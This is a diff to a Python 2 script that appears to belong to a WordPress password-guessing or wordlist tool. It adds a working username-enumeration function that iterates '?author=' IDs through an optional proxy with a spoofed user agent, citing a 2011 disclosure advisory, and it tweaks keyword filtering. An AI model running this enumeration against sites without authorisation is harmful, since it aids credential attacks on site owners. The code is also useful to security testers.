@@ -21,7 +21,7 @@
 
 import urllib, urllib2, re
 from random import randint
-from urlparse import urljoin
+from urlparse import urljoin, urlparse
 
 def request(url, params, proxy):
 	"""
@@ -98,6 +98,29 @@ def find_username(url, proxy):
         username = username.strip().replace("/","")
         return username
 
+def enumerate_usernames(base_url, proxy):
+    """
+    Enumerate usernames using TALSOFT-2011-0526 advisory (http://seclists.org/fulldisclosure/2011/May/493) present in WordPress > 3.2-beta2
+    """
+    uid = 1
+    usernames = []
+    while True:
+	try:
+	    request = urllib2.Request(base_url+"?author="+str(uid))
+	    request.add_header("User-agent", "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1")
+	    if proxy:
+		proxy_handler = urllib2.ProxyHandler({'http': proxy})
+		opener = urllib2.build_opener(proxy_handler)
+	    else:
+		opener = urllib2.build_opener()
+	    response =  opener.open(request)
+	    usernames.append(urlparse(response.geturl()).path.split("/")[2])
+	    uid = uid + 1
+	except urllib2.HTTPError:
+	    break
+
+    return usernames
+
 def find_keywords_in_url(url, proxy=None, min_keyword_len=3, min_frequency=2, ignore_with=[]):
     """
     Try to find relevant keywords within the given URL, usually this keywords will be used added to the wordlist
@@ -113,13 +136,13 @@ def find_keywords_in_url(url, proxy=None, min_keyword_len=3, min_frequency=2, ig
 
     # get keywords from title
     title = re.search('<title>.*</title>', data, re.IGNORECASE).group()
-    [keywords.insert(0,kw.lower()) for kw in title[7:-8].split(" ") if len(kw) > 3][:-1]
+    [keywords.insert(0,kw.lower()) for kw in title[7:-8].split(" ")][:-1]
 
     # get keywords from url content
     [keywords.append(k) for k in get_keywords(re.sub("<.*?>", "", data), min_keyword_len, min_frequency)]
 
     # filter keywords
-    keywords = [k for k in keywords if len(k) > min_keyword_len]    # min leght
+    keywords = [k.lower() for k in keywords if len(k) > min_keyword_len]    # min leght
     if len(ignore_with) > 0:	# ignore keywords with certain characters
 	for keyword in keywords:
 	    for i in ignore_with:
